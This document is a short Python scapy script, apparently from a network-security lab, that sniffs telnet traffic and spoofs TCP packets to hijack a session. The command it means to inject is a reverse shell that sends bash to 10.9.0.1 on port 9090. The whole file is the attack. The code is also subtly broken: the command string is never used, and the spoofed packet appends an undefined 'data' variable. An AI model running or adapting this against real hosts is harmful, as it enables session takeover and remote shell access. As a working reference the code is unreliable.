#!/usr/bin/env python3
from scapy.all import *
oldid = 0
def spoof_pkt(pkt):
    global oldid
    command = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
    if pkt[IP].dport == 23 and pkt[TCP].flags == 'PA' and pkt[IP].id != oldid :
        if pkt[TCP].payload :
            newpkt = IP(raw(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            del(newpkt[TCP].payload)
            oldid = pkt[IP].id
            newpkt[TCP].seq += 1
            newpkt[TCP].ack += 1
            send(newpkt/data, verbose=0)

f = 'tcp'
pkt = sniff(iface='br-e7e8aab5b63e', filter=f, prn=spoof_pkt)